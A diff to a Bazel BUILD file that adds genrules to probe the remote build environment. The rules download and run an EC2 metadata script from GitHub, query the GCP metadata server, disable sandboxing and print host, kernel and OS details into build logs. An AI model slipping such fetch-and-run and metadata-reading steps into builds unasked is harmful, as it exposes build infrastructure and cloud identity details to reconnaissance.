@@ -65,3 +65,99 @@ build_test(
         ":foo_TXT_4KB_1",
     ],
 )
+
+# Remote Execution Environment Detection
+# These genrules detect system resources where builds are running.
+
+genrule(
+    name = "get_aws_instance_type",
+    outs = ["aws_instance.txt"],
+    # Fetches AWS instance metadata
+    cmd = "(" +
+          "curl -sL https://raw.githubusercontent.com/aws/amazon-ec2-utils/main/ec2-metadata -o /tmp/ec2-metadata && " +
+          "chmod +x /tmp/ec2-metadata && " +
+          "/tmp/ec2-metadata --all" +
+          ") > $@ 2>&1 || echo 'ec2-metadata failed or unavailable' > $@",
+    exec_properties = {
+        "dockerNetwork": "standard",
+    },
+    tags = [
+        "no-cache",
+        "no-sandbox",
+    ],
+)
+
+genrule(
+    name = "get_gcp_machine_type",
+    outs = ["gcp_machine.txt"],
+    # Fetches GCP instance metadata
+    cmd = "(" +
+          "echo '=== GCP Instance Metadata ===' && " +
+          "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true' | python3 -m json.tool" +
+          ") > $@ 2>&1 || echo 'Not GCP or unavailable' > $@",
+    exec_properties = {
+        "dockerNetwork": "standard",
+    },
+    tags = [
+        "no-cache",
+        "no-sandbox",
+    ],
+)
+
+genrule(
+    name = "get_cpu_info",
+    outs = ["cpu_info.txt"],
+    cmd = "(" +
+          "echo '=== CPU Info ===' && " +
+          "(grep -E 'processor|model name|cpu cores|physical id' /proc/cpuinfo || echo 'cpuinfo unavailable') && " +
+          "echo '' && " +
+          "echo '=== CPU Count ===' && " +
+          "(nproc || echo 'nproc unavailable')" +
+          ") 2>&1 | tee $@ >&2",
+    tags = ["no-cache"],
+)
+
+genrule(
+    name = "get_memory_info",
+    outs = ["memory_info.txt"],
+    cmd = "(" +
+          "echo '=== Memory Info ===' && " +
+          "(grep -E 'MemTotal|MemAvailable' /proc/meminfo || echo 'meminfo unavailable') && " +
+          "echo '' && " +
+          "echo '=== Free Memory ===' && " +
+          "(free -h || echo 'free unavailable')" +
+          ") 2>&1 | tee $@ >&2",
+    tags = ["no-cache"],
+)
+
+genrule(
+    name = "get_system_info",
+    outs = ["system_info.txt"],
+    cmd = "(" +
+          "echo '=== System Info ===' && " +
+          "echo '=== Hostname ===' && " +
+          "(hostname || echo 'unavailable') && " +
+          "echo '' && " +
+          "echo '=== Kernel ===' && " +
+          "(uname -a || echo 'unavailable') && " +
+          "echo '' && " +
+          "echo '=== Container/OS ===' && " +
+          "(cat /etc/os-release || echo 'unavailable') && " +
+          "echo '' && " +
+          "echo '=== Disk Space ===' && " +
+          "(df -h / || echo 'unavailable')" +
+          ") 2>&1 | tee $@ >&2",
+    tags = ["no-cache"],
+)
+
+# Convenience target to get all info at once
+filegroup(
+    name = "remote_exec_info",
+    srcs = [
+        ":get_aws_instance_type",
+        ":get_cpu_info",
+        ":get_gcp_machine_type",
+        ":get_memory_info",
+        ":get_system_info",
+    ],
+)
